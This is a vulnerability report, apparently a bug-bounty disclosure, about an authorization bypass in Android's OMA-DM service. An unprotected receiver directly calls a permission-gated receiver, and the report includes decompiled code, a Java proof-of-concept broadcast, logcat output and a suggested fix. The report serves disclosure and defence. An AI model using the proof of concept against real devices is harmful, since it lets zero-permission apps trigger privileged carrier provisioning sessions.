# com.android.omadm.service — `TelephonyBroadcastReceiver` Bypasses `WRITE_OMADM_SETTINGS` Permission by Directly Invoking `DMIntentReceiver.onReceive()`

## Summary

`com.android.omadm.service` (the OMA-DM — Open Mobile Alliance Device Management — client that handles carrier device-management/provisioning sessions) protects its main entry point, `DMIntentReceiver`, with the `signature|privileged` permission `com.android.permission.WRITE_OMADM_SETTINGS`. A zero-permission app cannot send it a broadcast directly — the OS blocks delivery.

However, the same package also exports a **second**, **unprotected** receiver, `TelephonyBroadcastReceiver`, which handles the action `com.google.android.carrier.action.APP_ENABLED` (among others) by **directly constructing a `new DMIntentReceiver()` and calling its `onReceive(context, intent)` method as plain Java** — not via `Context.sendBroadcast()`. Android's broadcast-permission enforcement only applies to the OS-mediated `sendBroadcast()`/`onReceive()` IPC dispatch path; it has no effect on an in-process direct method call. This completely bypasses the `WRITE_OMADM_SETTINGS` gate and lets a zero-permission app reach `DMIntentReceiver`'s privileged internal logic — specifically the `TRIGGER_CARRIER_PROVISIONING` code path (`handleSettingTriggeredUpdateIntent()`), which unconditionally starts a real OMA-DM device-management session for an attacker-chosen subscription ID.

## Severity: MEDIUM (Integrity/Availability — authorization bypass)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Integrity — a zero-permission app can trigger execution of code that is explicitly protected by a `signature|privileged` permission (`WRITE_OMADM_SETTINGS`), entirely bypassing that authorization boundary, and use it to force an unauthorized OMA-DM carrier-provisioning/device-management session to start for an attacker-chosen subscription on demand. This is a genuine authorization-bypass bug (the permission model itself is defeated), independent of what the specific downstream effect happens to be on this test device.

## Affected Component

- **Package**: `com.android.omadm.service` (priv-app, `/product/priv-app/DMService/DMService.apk`)
- **Protected component**: `.DMIntentReceiver` — `android:permission="com.android.permission.WRITE_OMADM_SETTINGS"` (confirmed `protectionLevel:signature|privileged` via `adb shell pm list permissions -f`)
- **Bypass component**: `.TelephonyBroadcastReceiver` — exported, **no permission**, handles (among others) the **unprotected** action `com.google.android.carrier.action.APP_ENABLED` (confirmed unprotected: `adb shell am broadcast -a com.google.android.carrier.action.APP_ENABLED` succeeds with `result=0` even from a non-privileged shell, unlike the app's other, genuinely protected actions)

```
E: receiver
    A: android:name=".DMIntentReceiver"
    A: android:permission="com.android.permission.WRITE_OMADM_SETTINGS"
    A: android:exported=true

E: receiver
    A: android:name=".TelephonyBroadcastReceiver"
    A: android:exported=true
    (no android:permission attribute)
    intent-filter actions: com.android.phone.settings.CARRIER_PROVISIONING,
        com.android.phone.settings.TRIGGER_CARRIER_PROVISIONING,
        android.intent.action.BOOT_COMPLETED,
        com.google.android.carrier.action.APP_ENABLED   <-- NOT a protected broadcast
```

## Root Cause

`TelephonyBroadcastReceiver.onReceive()`:

```java
public class TelephonyBroadcastReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        ...
        if ("com.android.phone.settings.CARRIER_PROVISIONING".equals(action)
                || "com.android.phone.settings.TRIGGER_CARRIER_PROVISIONING".equals(action)
                || "android.intent.action.BOOT_COMPLETED".equals(action)) {
            new DMIntentReceiver().onReceive(context, intent);
        } else if ("com.google.android.carrier.action.APP_ENABLED".equals(action)) {
            new DMIntentReceiver().onReceive(context, intent);
        }
    }
}
```

`DMIntentReceiver.onReceive()` then dispatches on the (unchanged) intent action:

```java
public class DMIntentReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        ...
        if (action.equals("com.google.android.carrier.action.APP_ENABLED")) {
            logd("Take APP_ENABLED as TRIGGER_CARRIER_PROVISIONING");
            handleSettingTriggeredUpdateIntent(context, intent);   // <-- privileged action
            return;
        }
        ...
    }
}
```

`handleSettingTriggeredUpdateIntent()` reads the carrier's real OMA-DM server identifier from `CarrierConfigManager` and unconditionally kicks off a `CONFIGURATION_UPDATE` device-management flow for the subId in the intent:

```java
private void handleSettingTriggeredUpdateIntent(Context context, Intent intent) throws IOException {
    CarrierConfigManager ccm = context.getSystemService(CarrierConfigManager.class);
    int subId = intent.getIntExtra("android.telephony.extra.SUBSCRIPTION_INDEX", SubscriptionManager.getDefaultSubscriptionId());
    String serverId = ccm.getConfigForSubId(subId).getString("ci_action_on_sys_update_extra_val_string");
    Intent update = new Intent("com.android.omadm.service.CONFIGURATION_UPDATE");
    update.putExtra("ServerID", serverId);
    update.putExtra("Type", 5);
    update.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", subId);
    update.setComponent(new ComponentName("com.android.omadm.service", "com.android.omadm.service.DMIntentReceiver"));
    handleConfigurationUpdateIntent(context, update, 7);
}
```

`DMIntentReceiver.onReceive()`'s only real gate before dispatching is `subscriptionManager.isActiveSubscriptionId(intExtra)` (must match a genuinely active subscription on the device) — not any check that the caller held `WRITE_OMADM_SETTINGS`. Since Android only enforces manifest `android:permission` at the moment the OS itself dispatches a broadcast to a receiver, and `TelephonyBroadcastReceiver` bypasses that dispatch entirely by calling `.onReceive()` directly as a Java method, the permission is never consulted at all for this code path.

## Proof of Concept

A zero-permission app (`com.vrp.zeroperm`, no `<uses-permission>` declared) sends the unprotected `APP_ENABLED` broadcast explicitly to the unprotected relay receiver:

```java
Intent i = new Intent("com.google.android.carrier.action.APP_ENABLED");
i.setComponent(new ComponentName("com.android.omadm.service",
        "com.android.omadm.service.TelephonyBroadcastReceiver"));
i.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", 1);   // attacker-chosen subId
sendBroadcast(i);
```

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
09-29 16:04:08.414 10984 10984 I VRP-OmadmBypass: sendBroadcast() to TelephonyBroadcastReceiver returned normally
09-29 16:04:08.428 10870 10870 D DMTelephonyReceiver: action intent: com.google.android.carrier.action.APP_ENABLED, subId: 1
09-29 16:04:08.428 10870 10870 D DMIntentReceiver: action intent: com.google.android.carrier.action.APP_ENABLED, subId: 1
09-29 16:04:08.429 10870 10870 E DMIntentReceiver: It's not the active sub id, ignore the intent
```

This confirms `DMIntentReceiver`'s internal logic executed (`"action intent: ..."` is logged from inside `DMIntentReceiver.onReceive()` itself) as a direct, unmediated consequence of the zero-permission app's broadcast to the *unprotected* `TelephonyBroadcastReceiver`. As a control, the identical intent sent **directly** to `DMIntentReceiver` (the properly permission-gated component) produces **no** second `"DMIntentReceiver: action intent:"` log line — i.e. that path is correctly blocked by the OS at dispatch time, confirming the permission enforcement is real and working for the *intended* entry point, and is specifically bypassed only via the `TelephonyBroadcastReceiver` relay.

### Limitation honestly disclosed

This test device has no active SIM/subscription (`isActiveSubscriptionId()` returns false for every subId), so execution stops at the log line shown above (`"It's not the active sub id, ignore the intent"`) rather than reaching `handleSettingTriggeredUpdateIntent()`'s actual `CONFIGURATION_UPDATE` dispatch. On any device with an active subscription (i.e. essentially every real-world target), supplying the correct/default subId (`0` or `1` on a single-SIM device) would pass this check and reach the privileged code path. The authorization-bypass itself — reaching `WRITE_OMADM_SETTINGS`-gated code from a zero-permission caller — is fully and unambiguously demonstrated independent of this last, device-specific step; the downstream `ServerID` used is sourced from the real `CarrierConfigManager` (not attacker-controlled), so the primary impact is **unauthorized triggering** of a privileged device-management session/flow rather than redirection to an attacker-controlled server.

## Suggested Fix

Do not call `DMIntentReceiver.onReceive()` as a direct Java method from another component. Either merge the relevant actions into `DMIntentReceiver`'s own manifest-declared, permission-protected intent-filter, or have `TelephonyBroadcastReceiver` re-dispatch via `Context.sendBroadcast()` (targeting `DMIntentReceiver` explicitly) so the OS's permission check is actually consulted, or add an explicit `WRITE_OMADM_SETTINGS` check inside `DMIntentReceiver.onReceive()` itself so it is enforced regardless of how the method is invoked.

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.android.omadm.service` (priv-app)
- **Tested**: September 2026
